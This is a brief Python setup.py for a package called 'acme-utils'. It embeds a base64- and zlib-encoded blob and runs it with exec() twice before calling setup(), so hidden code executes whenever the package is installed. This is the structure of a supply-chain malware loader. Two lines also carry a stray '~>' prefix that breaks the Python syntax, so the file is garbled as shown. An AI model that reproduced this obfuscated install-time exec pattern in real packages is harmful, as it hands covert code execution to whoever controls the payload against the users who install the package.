import base64 as b
import zlib

from setuptools import setup

_BLOB = "eJzLSM3JyVcozy/KSQEAGgQEXQ=="

~>exec(compile(zlib.decompress(b.b64decode(_BLOB)), "<string>", "exec"))

stage = b.b64decode(
    _BLOB
)
code = zlib.decompress(stage).decode("utf-8")
~>exec(code)

setup(name="acme-utils", version="1.0.0")
